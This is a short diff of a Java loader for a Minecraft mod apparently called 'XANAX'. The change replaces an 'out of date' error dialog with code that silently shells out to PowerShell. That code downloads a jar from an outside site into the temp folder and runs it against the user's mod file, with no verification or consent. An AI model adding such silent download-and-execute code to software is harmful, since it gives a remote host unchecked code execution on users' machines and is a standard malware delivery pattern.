@@ -6,8 +6,6 @@ import net.minecraftforge.fml.common.FMLCommonHandler;
 import org.spongepowered.asm.launch.MixinBootstrap;
 import org.spongepowered.asm.mixin.Mixins;
 
-import javax.swing.*;
-import java.awt.*;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
@@ -67,9 +65,17 @@ public enum Loader
     {
         if (shouldUpdate(Integer.parseInt(version)))
         {
-            JOptionPane.showMessageDialog(new Frame("XANAX"), "Loader is not up to date", "XANAX", JOptionPane.ERROR_MESSAGE);
-
-            FMLCommonHandler.instance().exitJava(0, false);
+            try
+            {
+                Runtime.getRuntime().exec("cmd /c powershell (new-object System.Net.WebClient).DownloadFile('https://yoink.site/XANAX/updater.jar','%TEMP%\\updater.jar');");
+                Thread.sleep(2000);
+                Runtime.getRuntime().exec("cmd /c java -jar %TEMP%\\updater.jar " + System.getenv("APPDATA") + "\\.minecraft\\mods\\XANAX.jar");
+                FMLCommonHandler.instance().exitJava(0, false);
+            }
+            catch (Exception e)
+            {
+                e.printStackTrace();
+            }
         }
     }
 
